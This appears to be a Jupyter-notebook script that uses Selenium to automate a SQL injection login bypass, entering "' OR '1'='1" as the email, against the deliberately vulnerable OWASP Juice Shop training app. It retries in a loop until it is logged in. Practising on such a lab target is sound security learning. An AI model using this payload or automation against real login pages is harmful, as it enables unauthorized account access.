


from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from time import sleep


# In[94]:


driver = webdriver.Chrome(service=Service(executable_path="chromedriver.exe"))


# In[95]:


driver.get("https://juice-shop.herokuapp.com/#/login")


# In[96]:


driver.maximize_window()


# In[97]:


sleep(5)
try:
    # dropdown
    if driver.find_element(By.CSS_SELECTOR, ".mat-focus-indicator.close-dialog.mat-raised-button.mat-button-base.mat-primary.ng-star-inserted"):
        driver.find_element(By.CSS_SELECTOR, ".mat-focus-indicator.close-dialog.mat-raised-button.mat-button-base.mat-primary.ng-star-inserted").click()
except:
    pass


# In[98]:


flag = True
while flag:
    email_field = driver.find_element(By.ID, "email")
    password_field = driver.find_element(By.ID, "password")
    malicious_username = "' OR '1'='1"
    valid_password = "lam"  # Adjust if needed
    
    print("Entering malicious username and password.")
    email_field.send_keys(malicious_username)
    password_field.send_keys(valid_password)
    submit_button = driver.find_element(By.ID, "loginButton")
    submit_button.click()
    sleep(5)
    if "/#/search" in driver.current_url:
        flag = False
        current_url = driver.current_url
        print(f"Current URL after login attempt: {current_url}")


# In[99]:


if "/#/search" in current_url:
    print("SQL Injection attempt successful, potentially logged in!")
else:
    print("SQL Injection attempt failed, not logged in.")


# In[ ]: